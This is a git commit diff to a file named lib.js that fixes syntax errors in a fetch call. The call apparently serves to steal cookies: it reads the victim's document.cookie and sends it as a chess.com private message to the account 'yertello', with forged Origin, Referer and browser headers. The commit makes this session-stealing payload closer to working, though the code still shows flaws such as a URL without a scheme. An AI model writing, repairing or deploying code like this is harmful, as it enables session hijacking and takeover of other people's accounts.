d9b503545935cbb0f0b842af58eb3c4db9d39624
gasbildung <124586300+gasbildung@users.noreply.github.com>
2023-10-07 17:11:08 +0100

    Update lib.js

--- lib.js
+++ lib.js
@@ -8,10 +8,10 @@ fetch('www.chess.com/callback/messages/yertello',{
     'Cookie': document.cookie,
     'Origin': 'https://www.chess.com',
     'Referer': 'https://www.chess.com/messages/yertello',
-    'Sec-Ch-Ua':'"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"'
+    'Sec-Ch-Ua':'"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
   },
   body: {
     "message":document.cookie
-  })
+  }
 })
